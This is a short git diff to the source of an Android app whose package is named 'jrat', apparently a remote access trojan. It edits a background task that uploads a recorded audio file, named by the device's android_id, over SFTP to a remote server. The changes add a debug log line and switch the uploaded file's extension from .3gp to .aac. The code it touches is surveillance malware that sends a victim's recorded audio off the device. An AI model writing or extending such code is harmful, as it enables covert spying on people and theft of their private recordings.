@@ -2,6 +2,7 @@ package com.julioxus.jrat;
 
 import android.content.Context;
 import android.os.AsyncTask;
+import android.util.Log;
 
 import com.jcraft.jsch.Channel;
 import com.jcraft.jsch.ChannelSftp;
@@ -24,6 +25,7 @@ public class SendAudioAsyncTask extends AsyncTask<Context, Void, String> {
         this.fileName = fileName;
         this.android_id = android_id;
 
+        Log.d("Path fichero", fileName);
     }
 
     @Override
@@ -65,7 +67,7 @@ public class SendAudioAsyncTask extends AsyncTask<Context, Void, String> {
         // Send pictures to server
         try {
             String fsrc = fileName;
-            String fdest = android_id+"audio.3gp";
+            String fdest = android_id+"audio.aac";
             c.put(fsrc, fdest);
         } catch (Exception e) {
             e.printStackTrace();
